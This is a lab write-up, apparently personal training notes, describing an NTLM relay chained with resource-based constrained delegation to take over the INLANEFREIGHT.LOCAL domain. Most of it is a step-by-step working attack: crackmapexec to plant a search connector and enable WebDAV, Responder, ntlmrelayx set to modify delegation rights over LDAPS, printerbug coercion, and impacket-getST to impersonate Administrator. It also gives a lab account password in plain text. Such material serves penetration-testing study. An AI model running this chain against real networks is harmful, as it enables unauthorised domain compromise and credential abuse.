This is a very particular attack that will abuse a NTLM relay attack that will be chained to obtain a RBCD to eventually perform a total domain takeover.

## Attack Explanation
It is possible to abuse `RBCD` via relaying `NTLM` authentication because, by default, a computer can edit its own `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute; therefore, if we can coerce a target computer to perform `NTLM` authentication and relay it over `LDAP` to the DC, we can edit its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute and add any attacker-controlled computer.
Additionally, for this attack to succeed, the target computer must have the `WebClient` service (i.e., `WebDAV`) enabled, so that we can coerce it to perform `NTLM` authentication over `HTTP` instead of `SMB`, otherwise the DC will refuse the relayed requests due to its session signing requirements. However, if the DC is vulnerable to `CVE-2019-1040`, we can use the `--remove-mic` option of `ntlmrelayx` to relay `SMB` `NTLM` authentication over `LDAP`. The diagram below demonstrates the attack we will perform:
![[Pasted image 20241001110706.png]]

## Attack Path
We must first enable WEBDav(usualy enabled by default but not started) and to do so we can inject a ms-connector that points back to our listener over SQL01 and WS01 computer objects.
```shell-session
crackmapexec smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing FILENAME=@secret
```
After a while we should be able to see that now WEBDav is finally running.
```shell-session
crackmapexec smb 172.16.117.0/24 -u plaintext$ -p o6@ekK5#rlw2rAe -M webdav

SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.50   445    WS01             [*] Windows 10.0 Build 17763 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.60   445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\plaintext$:o6@ekK5#rlw2rAe
SMB         172.16.117.50   445    WS01             [+] INLANEFREIGHT.LOCAL\plaintext$:o6@ekK5#rlw2rAe
WEBDAV      172.16.117.50   445    WS01             WebClient Service enabled on: 172.16.117.50
SMB         172.16.117.60   445    SQL01            [+] INLANEFREIGHT.LOCAL\plaintext$:o6@ekK5#rlw2rAe
WEBDAV      172.16.117.60   445    SQL01            WebClient Service enabled on: 172.16.117.60
```
Now we setup our listener on Responder(**REMEMBER to disable SMB/HTTP spoofing from settings**).
```shell-session
sudo python3 Responder.py -I ens192
```
Next we need to edit the attribute over SQL01 that will allow the RBCD attack from WS01.
```shell-session
 sudo ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump
```
And perform a *authentication coercion* that will pingback to our listener by leveraging over *printer bug*.
```shell-session
python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.60 LINUX01@80/print
```
After some time we should be able to see in the *ntlmrelayx* that the RBCD have been delegated allowing now to impersonate **Administrator@SQL01**.
```shell-session
[*] HTTPD(80): Connection from INLANEFREIGHT/SQL01$@172.16.117.60 controlled, attacking target ldaps://INLANEFREIGHT\SQL01$@172.16.117.3
[*] HTTPD(80): Authenticating against ldaps://INLANEFREIGHT\SQL01$@172.16.117.3 as INLANEFREIGHT/SQL01$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Delegation rights modified succesfully!
[*] plaintext$ can now impersonate users on SQL01$ via S4U2Proxy
[*] All targets processed!
```
And now we can ask a ST(Service Ticket) to the TGS for impersonation as Administrator.
```shell-session
impacket-getST -spn cifs/sql01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.117.3 "INLANEFREIGHT"/"plaintext$":"o6@ekK5#rlw2rAe"
```
Enjoy the *ccache* ticket to take your attacks even further.